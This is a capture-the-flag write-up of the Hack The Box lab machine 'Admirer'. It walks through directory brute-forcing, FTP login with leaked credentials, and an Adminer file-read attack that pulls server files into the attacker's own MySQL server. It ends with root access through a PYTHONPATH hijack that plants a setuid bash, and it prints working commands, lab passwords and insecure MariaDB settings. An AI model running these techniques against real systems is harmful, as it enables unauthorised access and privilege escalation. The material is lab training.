---
"title": "Hack The Box - Admirer"
"date": 2020-09-30
"tags": ["linux", "easy", "env", "python", "path", "mysql"]
"keywords": ["linux", "easy", "env", "python", "path", "mysql"]
"categories": ["HackTheBox"]
"author": "Ghostbyt3"
"description": "We need to find some hidden .txt files and one of them have cresentials for FTP and FTP contains webpage backups but everything is old so we need to find new password for the Adminer and its vulnerable to SQL we can get new creds and login and To privesc, I’ll abuse sudo configured to allow me to pass in a PYTHONPATH, allowing a Python library hijack."
"featured_image": "/img/htb-admirer/Untitled.png"
"layout": "single"
"showTableOfContents": true
"authorbox": true
"pager": true
"toc": true
"mathjax": true
"sidebar": "right"
"subtitle": "HackTheBox - Writeup"
---


![Untitled](/img/htb-admirer/Untitled.png)

We need to find some hidden .txt files and one of them have cresentials for FTP and FTP contains webpage backups but everything is old so we need to find new password for the Adminer and its vulnerable to SQL we can get new creds and login and To privesc, I’ll abuse sudo configured to allow me to pass in a PYTHONPATH, allowing a Python library hijack.


Link: [https://www.hackthebox.eu/home/machines/profile/248](https://www.hackthebox.eu/home/machines/profile/248)

Let's Begin with our Initial Nmap Scan.

## Nmap Scan Results

```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/admin-dir
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Admirer
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.12 (94%), Linux 3.13 (94%), Linux 3.16 (94%), Linux 3.8 - 3.11 (94%), Linux 4.8 (94%), Linux 4.4 (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web Enumeration

It looks like an normal Webpage.

![Untitled](/img/htb-admirer/Untitled%201.png)

Found `robots.txt` and there is message from `waldo` and there is a secret directory `/admin-dir` which contains creds.

![Untitled](/img/htb-admirer/Untitled%202.png)

But we don't have permission on it.

![Untitled](/img/htb-admirer/Untitled%203.png)

So I decided to run Gobuster on `/admin-dir` 

```python
root@w0lf:~# gobuster dir -u http://10.10.10.187/admin-dir/ -w /usr/share/wordlists/dirb/big.txt -x txt,php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.187/admin-dir/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,php
[+] Timeout:        10s
===============================================================
2020/05/07 16:22:45 Starting gobuster
===============================================================
/contacts.txt (Status: 200)
/credentials.txt (Status: 200)
===============================================================
2020/05/07 16:39:49 Finished
===============================================================
```

We found some Interesting files.

`/contacts.txt`

![Untitled](/img/htb-admirer/Untitled%204.png)

`/credentials.txt`

![Untitled](/img/htb-admirer/Untitled%205.png)

We know FTP port is open and there is a credential for it.

## FTP

Logged in to FTP with `ftpuser : %n?4Wz}R$tTF7`, Downloaded those 2 Files to my machine.

```python
root@w0lf:~/CTF/HTB/Boxes/Admirer# ftp 10.10.10.187
Connected to 10.10.10.187.
220 (vsFTPd 3.0.3)
Name (10.10.10.187:root): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0            3405 Dec 02 21:24 dump.sql
-rw-r--r--    1 0        0         5270987 Dec 03 21:20 html.tar.gz
226 Directory send OK.
ftp> get dump.sql
local: dump.sql remote: dump.sql
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for dump.sql (3405 bytes).
226 Transfer complete.
3405 bytes received in 0.00 secs (20.2954 MB/s)
ftp> get html.tar.gz
local: html.tar.gz remote: html.tar.gz
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for html.tar.gz (5270987 bytes).
226 Transfer complete.
5270987 bytes received in 9.46 secs (543.9593 kB/s)
```

Its the file we saw in the webpage, but this time we got a new directory.

```bash
root@w0lf:~/CTF/HTB/Boxes/Admirer# gzip -d html.tar.gz 
root@w0lf:~/CTF/HTB/Boxes/Admirer# ls
dump.sql  html.tar
root@w0lf:~/CTF/HTB/Boxes/Admirer# tar xvf html.tar 
root@w0lf:~/CTF/HTB/Boxes/Admirer# ls
assets  dump.sql  html.tar  images  index.php  robots.txt  utility-scripts  w4ld0s_s3cr3t_d1r
```

We got Database Password for user `waldo`.

```bash
root@w0lf:~/CTF/HTB/Boxes/Admirer/web/utility-scripts# ls
admin_tasks.php  db_admin.php  info.php  phptest.php
root@w0lf:~/CTF/HTB/Boxes/Admirer/web/utility-scripts# cat db_admin.php 
<?php
  $servername = "localhost";
  $username = "waldo";
  $password = "Wh3r3_1s_w4ld0?";

  // Create connection
  $conn = new mysqli($servername, $username, $password);

  // Check connection
  if ($conn->connect_error) {
      die("Connection failed: " . $conn->connect_error);
  }
  echo "Connected successfully";

  // TODO: Finish implementing this or find a better open source alternative
?>
```

`index.php` file which we got from the `.tar` file and it also contains Database Password for user `waldo`

![Untitled](/img/htb-admirer/fff.png)

After some enumeration, I decided to bruteforce `/utility-scripts` directory

### Gobuster Results

```bash
==============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.187/utility-scripts/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/05/07 17:01:22 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htaccess.php (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/adminer.php (Status: 200)
/info.php (Status: 200)
/phptest.php (Status: 200)
===============================================================
2020/05/07 17:16:42 Finished
===============================================================
```

`/adminer.php` so this must be a hint from the box name.

![Untitled](/img/htb-admirer/Untitled%206.png)

Tried all the credentials I found so far to login, but non are valid. Since we got the version I started searching for exploits.

Finally I found this [https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool](https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool)

## Exploiting Adminer

By Following the article, instead of trying to connect to the box’s MySQL database, I gonna connect “back” to my MySQL database hosted on my server.

Created an New User and I tried to login `mysql` from user `hacker` I get Access Denied.

```bash
root@w0lf:~/CTF/HTB/Boxes/Admirer# useradd hacker
root@w0lf:~/CTF/HTB/Boxes/Admirer# passwd hacker
New password: 
Retype new password: 
passwd: password updated successfully
root@w0lf:~/CTF/HTB/Boxes/Admirer# su hacker
$ mysql -u hacker -p
Enter password: 
ERROR 1698 (28000): Access denied for user 'hacker'@'localhost'
```

To solve that above problem, Run these commands in `root`

![Untitled](/img/htb-admirer/Untitled%207.png)

> --skip-grant-tables option enables anyone to connect without a password and with all privileges, and disables account-management statements such as ALTER USER and SET PASSWORD.

I did a nmap scan to check whether the port is open. Now I can login to the Mysql, and I created new database `test`.

```bash
$ nmap -p3306 10.10.14.9
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-07 19:58 IST
Nmap scan report for 10.10.14.9
Host is up (0.000084s latency).

PORT     STATE SERVICE
3306/tcp open  mysql

Nmap done: 1 IP address (1 host up) scanned in 5.58 seconds

$ mysql -u hacker -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 9
Server version: 10.3.22-MariaDB-1 Debian buildd-unstable

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> create database test;
Query OK, 1 row affected (0.000 sec)

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| test               |
+--------------------+
4 rows in set (0.001 sec)

MariaDB [(none)]>
```

> **NOTE:** If you get any `Connection Refused` error while login, edit `/etc/mysql/mariadb.conf.d/50-server.cnf`(This might be different for you) and change 
`bind-address = 0.0.0.0`

With the credentials I used for user `hacker` I can now login.

![Untitled](/img/htb-admirer/Untitled%208.png)

Successfully logged into our database. 

![Untitled](/img/htb-admirer/Untitled%209.png)

I created a new table `test` to get data from a file from Adminer instance, into my a database.

```bash
MariaDB [test]> show tables;
Empty set (0.000 sec)

MariaDB [test]> CREATE TABLE test (name VARCHAR(10000));
Query OK, 0 rows affected (0.214 sec)

MariaDB [test]> show tables;
+----------------+
| Tables_in_test |
+----------------+
| test           |
+----------------+
1 row in set (0.001 sec)

MariaDB [test]>
```

I tried to get `index.php` because we already got a `index.php` file from the `FTP` which contains `waldo` Database Credentials but it is Invalid( May be Old Password), So I tried to get the new password.

```bash
load data local infile '../index.php'
into table test
fields terminated by "\n"
```

## Getting User Shell

Once Executed choose `select` in the left side bar.

![Untitled](/img/htb-admirer/Untitled%2010.png)

And I found the new login credentials.

![Untitled](/img/htb-admirer/Untitled%2011.png)

I logged in `SSH` with the credentials `waldo : &[h5b~yK3F#{PaPB&dA}{H](h5b~yK3F#{PaPB&dA}{H)` we found.

![Untitled](/img/htb-admirer/Untitled%2012.png)

## Privilege Escalation

Like always I started with `sudo -l`

![Untitled](/img/htb-admirer/Untitled%2013.png)

I ran the script and it shows some option to select.

```python
waldo@admirer:/opt/scripts$ sudo ./admin_tasks.sh 

[[[ System Administration Menu ]]]
1) View system uptime
2) View logged in users
3) View crontab
4) Backup passwd file
5) Backup shadow file
6) Backup web data
7) Backup DB
8) Quit
Choose an option:
```

Which checking the source I found something Interesting, `Backup Web data` runs a python script which is `[backup.py](http://backup.py)` 

```python
backup_web()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running backup script in the background, it might take a while..."
        /opt/scripts/backup.py &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}
```

I found its using a module called `shutil`

```python
waldo@admirer:/opt/scripts$ cat backup.py 
#!/usr/bin/python3

from shutil import make_archive

src = '/var/www/html/'

# old ftp directory, not used anymore
#dst = '/srv/ftp/html'

dst = '/var/backups/html'

make_archive(dst, 'gztar', src)
```

> PYTHONPATH is an environment variable which you can set to add additional directories where python will look for modules and packages.

So I created `[shutil.py](http://shutil.py)` in `/var/tmp` which helps me to get root.

```python
waldo@admirer:/var/tmp$ cat shutil.py 
import os
os.system('cp /bin/bash /var/tmp;chmod 4755 /var/tmp/bash')
```

What this will do? This will copy the `bash` to `/var/tmp`  and give SETUID to the binary.

```python
waldo@admirer:/opt/scripts$ export PYTHONPATH=/var/tmp
```

> sudo PYTHONPATH=/var/tmp /opt/scripts/admin_tasks.sh

![Untitled](/img/htb-admirer/Untitled%2014.png)

![Untitled](/img/htb-admirer/Untitled%2015.png)

We Own the Root!!